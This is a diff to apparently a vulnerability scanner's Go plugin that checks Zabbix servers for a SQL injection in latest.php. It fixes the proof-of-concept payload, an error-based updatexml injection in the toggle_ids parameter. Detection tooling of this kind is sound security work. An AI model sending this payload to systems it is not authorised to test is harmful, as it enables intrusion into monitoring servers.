@@ -34,7 +34,9 @@ func (d *zabbixLatestSQL) Init() plugin.Plugin {
 	return d.info
 }
 func (d *zabbixLatestSQL) GetResult() []plugin.Plugin {
-	return d.result
+	var result = d.result
+	d.result = []plugin.Plugin{}
+	return result
 }
 func (d *zabbixLatestSQL) Check(URL string, meta plugin.TaskMeta) bool {
 	request, err := http.NewRequest("GET", URL+"/dashboard.php", nil)
@@ -50,7 +52,7 @@ func (d *zabbixLatestSQL) Check(URL string, meta plugin.TaskMeta) bool {
 	if len(sid) < 1 {
 		return false
 	}
-	poc := fmt.Sprintf("/latest.php?output=ajax&sid=%s&favobj=toggle&toggle_open_state=1&toggle_ids[]=(select 0updatexml(1,concat(0x7e,(SELECT md5(666)),0x7e),1))", sid[1])
+	poc := fmt.Sprintf("/latest.php?output=ajax&sid=%s&favobj=toggle&toggle_open_state=1&toggle_ids[]=(select updatexml(1,concat(0x7e,(SELECT md5(666)),0x7e),1))", sid[1])
 	request, err = http.NewRequest("GET", URL+poc, nil)
 	if err != nil {
 		return false
